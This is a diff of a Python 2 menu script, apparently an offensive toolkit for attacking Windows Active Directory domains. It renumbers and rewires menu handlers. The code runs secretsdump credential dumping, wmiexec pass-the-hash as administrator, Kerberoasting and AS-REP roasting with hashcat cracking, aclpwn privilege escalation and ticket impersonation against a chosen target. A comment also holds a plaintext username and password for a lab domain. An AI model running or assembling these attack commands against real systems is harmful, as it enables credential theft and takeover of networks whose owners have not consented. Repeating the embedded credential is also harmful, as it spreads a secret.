@@ -259,16 +259,16 @@ def display():
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
 
-   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) GetArch   (30)                (40) RpcClient      (50) ACLPWN       (60) FTP    " + u'\u2551'
-   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) NetView   (31)                (41) GetGt          (51) SecretsDump  (61) SSH    " + u'\u2551'
-   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services  (32) LookupSid      (42) GetSt          (52) CrackMapExec (62) TelNet " + u'\u2551'
-   print u'\u2551' + "(3) Re/Set USERNAME    (13) Ping REMOTE IP     (23) AtExec    (33) SamrDump       (43) GetUsersPns    (53) WmiExec HASH (63) NetCat " + u'\u2551'
-   print u'\u2551' + "(4) Re/Set PASSWORD    (14) AdiDNSdump Records (24) DcomExec  (34) RpcDump        (44) GetAdUsers     (54)              (64) WinRem " + u'\u2551'
-   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Fierce DNS SERVER  (25) PsExec    (35) Reg            (45) KerbCheckUsers (55)              (65)        " + u'\u2551'
-   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec   (36) SmbClient      (46) GetNpUsers     (56)              (66)        " + u'\u2551'
-   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) WmiExec   (37) SmbMap SHARE   (47) BLANK          (57)              (67)        " + u'\u2551'
-   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap     (38) SmbMount SHARE (48) WinDapSearch   (58)              (68)        " + u'\u2551'
-   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump    (39) Enum4Linux     (49) LdapDomainDump (59)              (69)        " + u'\u2551'
+   print u'\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) GetArch  (30) Enum4Linux     (40) Gold Ticket    (50) Domain Dump  (60) FTP     " + u'\u2551'
+   print u'\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) NetView  (31) WinDapSearch   (41) Silver Ticket  (51) BLOODHOUND   (61) SSH     " + u'\u2551'
+   print u'\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) LookupSid      (42) GetUsersPns    (52) ACLPWN       (62) TelNet  " + u'\u2551'
+   print u'\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) SamDump Users  (43) GetAdusers     (53) SecretsDump  (63) NetCat  " + u'\u2551'
+   print u'\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) RpcDump        (44) KerbChecKUsers (54) CrackMapExec (64) WinRem  " + u'\u2551'
+   print u'\u2551' + "(5) Re/Set FOREST NAME (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) GetNPUsers     (55) WmiExec HASH (65)         " + u'\u2551'
+   print u'\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) SmbClient      (46)                (56)              (66)         " + u'\u2551'
+   print u'\u2551' + "(7) Re/Set WORK GROUP  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47)                (57)              (67)         " + u'\u2551'
+   print u'\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48)                (58)              (68)         " + u'\u2551'
+   print u'\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49)                (59)              (69)         " + u'\u2551'
    print u'\u255A' + (u'\u2550')*132 + u'\u255D'
 
 # -------------------------------------------------------------------------------------
@@ -966,23 +966,23 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - ./ifmap.py 192.168.1.103 135
+# Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='30':
-      exit(1)
+   if selection == '30':
+      command("enum4linux -v " + TIP.rstrip(" "))
 
-# ------------------------------------------------------------------------------------- 
+#------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - 
+# Details : Menu option selected - windapsearch.py-d 10.10.10.169 -u MEGABANK\\ryan -p Serv3r4Admin4cc123! -GUC --da --full
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='31':
-      exit(1)
+      command(PRO + "windapsearch.py -d " + HST.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1093,22 +1093,11 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '39':
-      command("enum4linux -v " + TIP.rstrip(" "))
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
 # Details : Menu option selected - rpcclient -U name ip 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '40':
+   if selection == '39':
       command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
@@ -1119,7 +1108,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '41':
+   if selection == '40':
       command(PRO + "getTGT.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
@@ -1130,7 +1119,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '42':
+   if selection == '41':
       command(PRO + "getST.py -impersonate " + POR.strip(" ") + " -spn cifs/" + HST.rstrip(" ") + " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
@@ -1141,7 +1130,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '43':
+   if selection == '42':
       command(PRO + "GetUserSPNs.py -request -target-domain " + HST.rstrip(" ") +  " " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ")) 
 
 # ------------------------------------------------------------------------------------- 
@@ -1152,7 +1141,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '44':
+   if selection == '43':
       command(PRO + "GetADUsers.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
@@ -1163,7 +1152,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '45':
+   if selection == '44':
       print "\nPlease wait..."
       os.system("nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=" + HST.rstrip(" ") + ",userdb=users.txt " + TIP.rstrip(" ") + " >> KUSERS.tmp")
       os.system("sed -i '/@/!d' KUSERS.tmp")
@@ -1202,7 +1191,7 @@ while True:
 # Modified: N/A                    megabank/-no-pass -usersfile users.txt
 # -------------------------------------------------------------------------------------
 
-   if selection =='46':
+   if selection =='45':
       if linecache.getline('users.txt', 1) != "":
          command(PRO + "GetNPUsers.py -outputfile hashroast.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt")
          command("hashcat -m 18200 --force -a 0 hashroast.txt /usr/share/wordlists/rockyou.txt -o cracked.txt")
@@ -1218,32 +1207,8 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='47':
+   if selection =='46':
       exit(1)
-
-#------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - windapsearch.py-d 10.10.10.169 -u MEGABANK\\ryan -p Serv3r4Admin4cc123! -GUC --da --full
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='48':
-      command(PRO + "windapsearch.py -d " + HST.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
-
-# -------------------------------------------------------------------------------------
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - ldapdomaindump -u domain\user - PAS IP -o \DIR
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='49':
-      command("ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
-      print "\nChecking downloaded files: "
-      command("ls -la ./" + DIR.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1253,7 +1218,64 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
+   if selection =='47':
+      exit(1)
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '48':
+      exit(1)
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '49':
+      exit(1)
+
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - ldapdomaindump -u domain\user - PAS IP -o \DIR
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
    if selection =='50':
+      command("ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+      print "\nChecking downloaded files: "
+      command("ls -la ./" + DIR.rstrip(" "))
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - BLOODHOUND ZIP FILE ETC
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='51':
+      command("echo 'Reserved for BLOODHOUND command...'")
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='52':
       command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + " -d " + HST.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
@@ -1264,7 +1286,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='51':
+   if selection =='53':
       os.remove("SECRETS.tmp")
       os.system(PRO + "secretsdump.py " + HST.rstrip(" ") + '/' + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> SECRETS.tmp")
       command("cat SECRETS.tmp")
@@ -1292,7 +1314,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='52':
+   if selection =='54':
       HASHED = "................................"
       for x in range (0,MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):
@@ -1310,34 +1332,12 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='53':
+   if selection =='55':
       for x in range (0,MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):
             HASHED = PA[x].rstrip(" ")
 
-      command(PRO + "wmiexec.py -hashes :" + HASHED + " administrator@" + TIP.rstrip(" "))
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='54':
-      exit(1)       
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='55':
-      exit(1)       
+      command(PRO + "wmiexec.py -hashes :" + HASHED + " administrator@" + TIP.rstrip(" "))    
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
